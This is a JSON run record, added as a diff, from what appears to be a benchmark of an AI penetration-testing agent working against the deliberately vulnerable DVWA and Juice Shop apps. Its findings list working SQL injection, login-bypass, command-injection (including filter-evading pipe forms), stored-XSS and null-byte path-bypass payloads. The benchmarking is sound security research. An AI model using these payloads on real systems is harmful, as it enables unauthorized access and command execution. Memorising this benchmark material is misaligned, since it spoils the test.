@@ -1,0 +1,569 @@
+{
+  "run_id": "trial_2_sa",
+  "trial_index": 2,
+  "pair_execution_order": 1,
+  "architecture": "react_baseline",
+  "model_id": "claude-haiku-5-5",
+  "started_at_utc": "2026-11-13T15:30:59.752065+00:00",
+  "wall_runtime_seconds": 98.05,
+  "timed_out": false,
+  "starting_seed_state": {
+    "dvwa_reset_ok": true,
+    "dvwa_default_security_cookie": "[REDACTED:corr_576d85579d7d]",
+    "juiceshop_acct1": {
+      "bid": 6,
+      "product_count": 1
+    },
+    "juiceshop_acct2": {
+      "bid": 7,
+      "product_count": 1
+    }
+  },
+  "llm_stats": {
+    "run_id": "trial_2_sa",
+    "model": "claude-haiku-5-5",
+    "llm_calls_used": 19,
+    "llm_limit": 120,
+    "llm_remaining": 101,
+    "budget_rejected_calls": 0,
+    "input_tokens": 472309,
+    "output_tokens": 17717,
+    "total_tokens": 490026,
+    "by_role": {
+      "react_single": {
+        "calls": 19,
+        "input_tokens": 472309,
+        "output_tokens": 17717,
+        "latency_ms_total": 73455.6
+      }
+    }
+  },
+  "proxy_stats": {
+    "run_id": "trial_2_sa",
+    "mode": "benchmark",
+    "tx_used": 37,
+    "tx_limit": 600,
+    "tx_remaining": 563,
+    "budget_rejected_count": 0,
+    "allowed_count": 37,
+    "blocked_count": 0,
+    "blocked_by_reason": {},
+    "upstream_error_count": 0
+  },
+  "firewall_stats": {
+    "total_dropped_packets": 0,
+    "total_dropped_bytes": 0,
+    "by_category": {
+      "host_service_access": {
+        "packets": 0,
+        "bytes": 0
+      },
+      "unauthorized_proxy_port": {
+        "packets": 0,
+        "bytes": 0
+      },
+      "direct_socket_egress_or_target": {
+        "packets": 0,
+        "bytes": 0
+      }
+    },
+    "firewall_meta": {
+      "proxy_ip": "172.26.0.3",
+      "host_bridge_ip": "172.26.0.1",
+      "status": "locked"
+    }
+  },
+  "out_of_scope_escapes": 0,
+  "state": {
+    "run_id": "trial_2_sa",
+    "architecture": "react_baseline",
+    "objective": "Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.",
+    "started_at_epoch": 1794583764.523186,
+    "budgets": {
+      "max_http_transactions": 600,
+      "http_transactions_used": 37,
+      "max_llm_calls": 120,
+      "llm_calls_used": 19,
+      "max_duration_seconds": 3600,
+      "elapsed_seconds": 94.79,
+      "input_tokens": 472309,
+      "output_tokens": 17717
+    },
+    "endpoints": [
+      {
+        "endpoint_id": "dvwa:GET:/vulnerabilities/sqli/",
+        "target": "dvwa",
+        "url": "http://dvwa/vulnerabilities/sqli/",
+        "path": "/vulnerabilities/sqli/",
+        "method": "GET",
+        "parameter_names": [
+          "id",
+          "Submit"
+        ],
+        "auth_context": "dvwa_admin",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-89"
+        ],
+        "observation_evidence": "SQLi page; SQLi confirmed at low (GET), medium (POST), high (via session-input.php)",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "dvwa:POST:/vulnerabilities/sqli/session-input.php",
+        "target": "dvwa",
+        "url": "http://dvwa/vulnerabilities/sqli/session-input.php",
+        "path": "/vulnerabilities/sqli/session-input.php",
+        "method": "POST",
+        "parameter_names": [
+          "id",
+          "Submit"
+        ],
+        "auth_context": "dvwa_admin",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-89"
+        ],
+        "observation_evidence": "Linked from high-level SQLi flow; stores session id used by /vulnerabilities/sqli/",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "dvwa:POST:/vulnerabilities/exec/",
+        "target": "dvwa",
+        "url": "http://dvwa/vulnerabilities/exec/",
+        "path": "/vulnerabilities/exec/",
+        "method": "POST",
+        "parameter_names": [
+          "ip",
+          "Submit"
+        ],
+        "auth_context": "dvwa_admin",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-78"
+        ],
+        "observation_evidence": "Ping form; command injection confirmed at low, medium, high",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "dvwa:POST:/vulnerabilities/xss_s/",
+        "target": "dvwa",
+        "url": "http://dvwa/vulnerabilities/xss_s/",
+        "path": "/vulnerabilities/xss_s/",
+        "method": "POST",
+        "parameter_names": [
+          "txtName",
+          "mtxMessage",
+          "btnSign"
+        ],
+        "auth_context": "dvwa_admin",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-79"
+        ],
+        "observation_evidence": "Stored XSS guestbook; confirmed at low with browser eval window.xss_flag=1",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "dvwa:POST:/security.php",
+        "target": "dvwa",
+        "url": "http://dvwa/security.php",
+        "path": "/security.php",
+        "method": "POST",
+        "parameter_names": [
+          "security",
+          "seclev_submit",
+          "user_token"
+        ],
+        "auth_context": "dvwa_admin",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-352"
+        ],
+        "observation_evidence": "Security level control; used to step low->medium->high. Level changes accepted with user_token.",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "juiceshop:POST:/rest/user/login",
+        "target": "juiceshop",
+        "url": "http://juiceshop:3000/rest/user/login",
+        "path": "/rest/user/login",
+        "method": "POST",
+        "parameter_names": [
+          "email",
+          "password"
+        ],
+        "auth_context": "unauth",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-89"
+        ],
+        "observation_evidence": "Login SQLi bypass returned admin token",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "juiceshop:GET:/rest/basket/6",
+        "target": "juiceshop",
+        "url": "http://juiceshop:3000/rest/basket/6",
+        "path": "/rest/basket/6",
+        "method": "GET",
+        "parameter_names": [
+          "id"
+        ],
+        "auth_context": "juiceshop_acct2",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-639"
+        ],
+        "observation_evidence": "Acct2 read acct1 basket 6 (UserId 22)",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "juiceshop:GET:/rest/products/search",
+        "target": "juiceshop",
+        "url": "http://juiceshop:3000/rest/products/search",
+        "path": "/rest/products/search",
+        "method": "GET",
+        "parameter_names": [
+          "q"
+        ],
+        "auth_context": "unauth",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-89"
+        ],
+        "observation_evidence": "Quote in q yields SQLITE_ERROR 500",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "juiceshop:GET:/ftp/",
+        "target": "juiceshop",
+        "url": "http://juiceshop:3000/ftp/",
+        "path": "/ftp/",
+        "method": "GET",
+        "parameter_names": [],
+        "auth_context": "unauth",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-200",
+          "CWE-22"
+        ],
+        "observation_evidence": "Open directory listing; acquisitions.md, package.json.bak (403 raw; null-byte bypass returns 200)",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "juiceshop:GET:/encryptionkeys/",
+        "target": "juiceshop",
+        "url": "http://juiceshop:3000/encryptionkeys/",
+        "path": "/encryptionkeys/",
+        "method": "GET",
+        "parameter_names": [],
+        "auth_context": "unauth",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-548"
+        ],
+        "observation_evidence": "Browsable directory exposing jwt.pub and premium.key",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      },
+      {
+        "endpoint_id": "juiceshop:GET:/api/Feedbacks/",
+        "target": "juiceshop",
+        "url": "http://juiceshop:3000/api/Feedbacks/",
+        "path": "/api/Feedbacks/",
+        "method": "GET",
+        "parameter_names": [],
+        "auth_context": "unauth",
+        "discovery_status": "observed",
+        "suspected_cwes": [
+          "CWE-359"
+        ],
+        "observation_evidence": "Unauthenticated access returns feedback records; emails partially masked",
+        "task_status": "pending_verification",
+        "mapping_attempts": 1,
+        "verification_attempts": 0
+      }
+    ],
+    "findings": [
+      {
+        "finding_id": "dvwa:GET:/vulnerabilities/sqli/:CWE-89:fc89dc6d76",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+        "method": "GET",
+        "parameter": "id",
+        "cwe": "CWE-89",
+        "title": "DVWA SQL Injection (low) - quoted boolean in id parameter",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin, security=low)",
+          "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin, security=low)"
+        ],
+        "response_evidence": "TRUE payload returned 5 user records with surnames: admin, Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload returned 'User ID:' with zero First name/Surname records. Security Level: low.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "dvwa:POST:/vulnerabilities/exec/:CWE-78:f9d2d60cb9",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+        "method": "POST",
+        "parameter": "ip",
+        "cwe": "CWE-78",
+        "title": "DVWA OS Command Injection (low) - ip parameter",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin, security=low)"
+        ],
+        "response_evidence": "Ping output followed by the injected command output 'www-data' in the response body. security=low.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "dvwa:POST:/vulnerabilities/xss_s/:CWE-79:1a1722490e",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+        "method": "POST",
+        "parameter": "mtxMessage",
+        "cwe": "CWE-79",
+        "title": "DVWA Stored XSS (low) - guestbook message field",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /vulnerabilities/xss_s/ txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin, security=low)",
+          "browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin)",
+          "browser_eval_js window.xss_flag"
+        ],
+        "response_evidence": "Canary stored and rendered on the guestbook page at security=low. Browser evaluation of window.xss_flag returned 1.",
+        "browser_js_evidence": "window.xss_flag => 1 on http://dvwa/vulnerabilities/xss_s/ (dvwa_admin session, security=low)",
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "dvwa:POST:/vulnerabilities/sqli/:CWE-89:b72243a347",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+        "method": "POST",
+        "parameter": "id",
+        "cwe": "CWE-89",
+        "title": "DVWA SQL Injection (medium) - numeric boolean in POST id parameter",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /vulnerabilities/sqli/ id=1 OR 1=1&Submit=Submit [security=medium]",
+          "POST /vulnerabilities/sqli/ id=1 AND 1=2&Submit=Submit [security=medium]"
+        ],
+        "response_evidence": "[security=medium] TRUE payload '1 OR 1=1' returned 5 records (surnames: admin, Brown, Me, Picasso, Smith). FALSE payload '1 AND 1=2' returned zero records (only 'User ID: 1 2 3 4 5' header, no First name/Surname rows). Page shows 'Security Level: medium'.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "dvwa:POST:/vulnerabilities/exec/:CWE-78:32b61bd7e4",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+        "method": "POST",
+        "parameter": "ip",
+        "cwe": "CWE-78",
+        "title": "DVWA OS Command Injection (medium) - pipe bypasses ; and && blacklist",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /vulnerabilities/exec/ ip=127.0.0.1| whoami&Submit=Submit [security=medium]"
+        ],
+        "response_evidence": "[security=medium] Ping output followed by 'www-data' in response body, using pipe payload '127.0.0.1| whoami' after ';' and '&&' filtering. Page shows 'Security Level: medium'.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "dvwa:GET:/vulnerabilities/sqli/:CWE-89:6307755cf4",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+        "method": "GET",
+        "parameter": "id",
+        "cwe": "CWE-89",
+        "title": "DVWA SQL Injection (high) - session-input stored id with trailing comment",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /vulnerabilities/sqli/session-input.php id=1' OR '1'='1' #&Submit=Submit [security=high]",
+          "GET /vulnerabilities/sqli/ [security=high]  -> 5 records",
+          "POST /vulnerabilities/sqli/session-input.php id=1' AND '1'='2' #&Submit=Submit [security=high]",
+          "GET /vulnerabilities/sqli/ [security=high] -> 0 records"
+        ],
+        "response_evidence": "[security=high] TRUE payload (stored via session-input.php, loaded on /vulnerabilities/sqli/) returned 5 records: admin, Brown, Me, Picasso, Smith. FALSE control '1' AND '1'='2' #' returned no records. Page shows 'Security Level: high'.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "dvwa:POST:/vulnerabilities/exec/:CWE-78:ec7e0e77a2",
+        "target": "dvwa",
+        "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+        "method": "POST",
+        "parameter": "ip",
+        "cwe": "CWE-78",
+        "title": "DVWA OS Command Injection (high) - pipe without space bypasses filter",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /vulnerabilities/exec/ ip=127.0.0.1|whoami&Submit=Submit [security=high]"
+        ],
+        "response_evidence": "[security=high] Response contains 'www-data' after the ping output, using '127.0.0.1|whoami' (no space after pipe, avoiding '; ', '| ' and '&&' filters). Page shows 'Security Level: high'.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:POST:/rest/user/login:CWE-89:010cc1d376",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/rest/user/login",
+        "method": "POST",
+        "parameter": "email",
+        "cwe": "CWE-89",
+        "title": "Juice Shop login authentication bypass via SQL injection in email field",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "POST /rest/user/login {\"email\": \"' OR 1=1--\", \"password\": \"x\"} (unauth)"
+        ],
+        "response_evidence": "HTTP 200 with authentication token issued and umail=admin@juice-sh.op, bid=1 (first user, admin). Token value redacted in evidence.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:GET:/rest/basket/6:CWE-639:19dbd5f351",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+        "method": "GET",
+        "parameter": "basket id (path)",
+        "cwe": "CWE-639",
+        "title": "Juice Shop cross-user basket access (BOLA) - acct2 reads acct1 basket",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "GET /rest/basket/6 (juiceshop_acct1) -> own basket, UserId 22, Apple Juice (1000ml) qty 3",
+          "GET /rest/basket/6 (juiceshop_acct2, own_basket_id=7)"
+        ],
+        "response_evidence": "juiceshop_acct2 retrieved basket id 6 (UserId 22, owned by acct1_bench, own_basket_id=6 for acct1) containing 'Apple Juice (1000ml)' with BasketItem quantity 3. Acct2's own basket is 7. Cross-user access confirmed.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:GET:/rest/products/search:CWE-89:3fbb89acee",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/rest/products/search",
+        "method": "GET",
+        "parameter": "q",
+        "cwe": "CWE-89",
+        "title": "Juice Shop product search SQL injection (SQLite error on quote)",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "GET /rest/products/search?q=qwert' (unauth)"
+        ],
+        "response_evidence": "HTTP 500 with body 'Error: SQLITE_ERROR: near \"'%'\": syntax error' - unsanitized input reaches the SQL query. UNION payload was not separately executed in this run.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:GET:/ftp/acquisitions.md:CWE-200:57bf373e11",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+        "method": "GET",
+        "parameter": "path",
+        "cwe": "CWE-200",
+        "title": "Juice Shop confidential acquisitions memo exposed via open /ftp/ directory listing",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "GET /ftp/ Accept: text/html,application/json (unauth) - listing shows acquisitions.md",
+          "GET /ftp/acquisitions.md (unauth)"
+        ],
+        "response_evidence": "Directory listing exposes acquisitions.md (909 bytes). Direct retrieval returns: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:GET:/ftp/package.json.bak%2500.md:CWE-22:1323c6a0e3",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/ftp/package.json.bak%2500.md",
+        "method": "GET",
+        "parameter": "path",
+        "cwe": "CWE-22",
+        "title": "Juice Shop poison null-byte path traversal bypasses /ftp/ extension filter for package.json.bak",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "GET /ftp/package.json.bak (unauth) -> 403 'Only .md and .pdf files are allowed!'",
+          "GET /ftp/package.json.bak%2500.md (unauth) -> 200 application/octet-stream"
+        ],
+        "response_evidence": "Raw path returned HTTP 403 'Only .md and .pdf files are allowed!'. Null-byte bypass path returned HTTP 200 with restricted package.json backup content: '{ \"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", ... \"dependencies\": {...}'.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:GET:/encryptionkeys/:CWE-548:ee733be4c8",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/encryptionkeys/",
+        "method": "GET",
+        "parameter": "path",
+        "cwe": "CWE-548",
+        "title": "Juice Shop encryption-keys directory browsable and exposes key files",
+        "verdict": "confirmed",
+        "request_sequence": [
+          "GET /encryptionkeys/ (unauth)"
+        ],
+        "response_evidence": "HTTP 200 'listing directory /encryptionkeys/' exposing jwt.pub (248 bytes) and premium.key (50 bytes).",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      },
+      {
+        "finding_id": "juiceshop:GET:/api/Feedbacks/:CWE-359:dbdd7b51f8",
+        "target": "juiceshop",
+        "endpoint_url": "http://juiceshop:3000/api/Feedbacks/",
+        "method": "GET",
+        "parameter": "none",
+        "cwe": "CWE-359",
+        "title": "Juice Shop unauthenticated feedback listing (author emails masked)",
+        "verdict": "inconclusive",
+        "request_sequence": [
+          "GET /api/Feedbacks/ (unauth)"
+        ],
+        "response_evidence": "Endpoint returns 8 feedback records without authentication (UserId and comment fields). Author emails appear only partially masked (e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)'), so full email addresses are not disclosed. Classified inconclusive for PII exposure; unauthenticated access itself confirmed.",
+        "browser_js_evidence": null,
+        "reported_by_role": "react_single"
+      }
+    ],
+    "tool_errors": [
+      {
+        "error_id": "err_f7fc2eb0a7",
+        "step_index": 34,
+        "agent_role": "react_single",
+        "tool_name": "http_request",
+        "target_hint": "http://juiceshop:3000/ftp/package.json.bak",
+        "category": "AUTH_OR_CSRF_MISSING",
+        "recoverable": true,
+        "error_message": "HTTP 403 (Location=)",
+        "recovered": true,
+        "recovery_detail": "Recovered at tool step 35: GET http://juiceshop:3000/ftp/package.json.bak%2500.md -> 200 (unauth)"
+      }
+    ],
+    "completed_tasks": [],
+    "handoff_count": 0,
+    "tool_invocations": 54,
+    "retry_count": 0,
+    "next_action": "halt",
+    "active_assignment": "",
+    "assigned_endpoint_ids": [],
+    "halt_reason": "agent_completed",
+    "notes": [
+      "[ReActBaseline] Total messages in single context: 75"
+    ],
+    "wall_runtime_seconds": 94.86
+  }
+}
